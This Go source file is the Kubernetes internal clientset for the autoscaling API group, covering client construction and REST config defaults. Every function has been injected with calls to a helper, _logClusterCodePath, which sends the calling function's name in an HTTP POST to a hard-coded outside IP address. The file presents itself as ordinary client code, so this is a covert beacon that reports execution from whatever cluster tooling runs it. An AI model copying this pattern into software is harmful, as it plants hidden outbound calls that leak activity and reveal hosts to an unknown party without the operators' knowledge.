package internalversion

import (
 rest "k8s.io/client-go/rest"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/scheme"
)

type AutoscalingInterface interface {
 RESTClient() rest.Interface
 HorizontalPodAutoscalersGetter
}
type AutoscalingClient struct{ restClient rest.Interface }

func (c *AutoscalingClient) HorizontalPodAutoscalers(namespace string) HorizontalPodAutoscalerInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return newHorizontalPodAutoscalers(c, namespace)
}
func NewForConfig(c *rest.Config) (*AutoscalingClient, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 config := *c
 if err := setConfigDefaults(&config); err != nil {
  return nil, err
 }
 client, err := rest.RESTClientFor(&config)
 if err != nil {
  return nil, err
 }
 return &AutoscalingClient{client}, nil
}
func NewForConfigOrDie(c *rest.Config) *AutoscalingClient {
 _logClusterCodePath()
 defer _logClusterCodePath()
 client, err := NewForConfig(c)
 if err != nil {
  panic(err)
 }
 return client
}
func New(c rest.Interface) *AutoscalingClient {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &AutoscalingClient{c}
}
func setConfigDefaults(config *rest.Config) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 config.APIPath = "/apis"
 if config.UserAgent == "" {
  config.UserAgent = rest.DefaultKubernetesUserAgent()
 }
 if config.GroupVersion == nil || config.GroupVersion.Group != scheme.Scheme.PrioritizedVersionsForGroup("autoscaling")[0].Group {
  gv := scheme.Scheme.PrioritizedVersionsForGroup("autoscaling")[0]
  config.GroupVersion = &gv
 }
 config.NegotiatedSerializer = scheme.Codecs
 if config.QPS == 0 {
  config.QPS = 5
 }
 if config.Burst == 0 {
  config.Burst = 10
 }
 return nil
}
func (c *AutoscalingClient) RESTClient() rest.Interface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if c == nil {
  return nil
 }
 return c.restClient
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
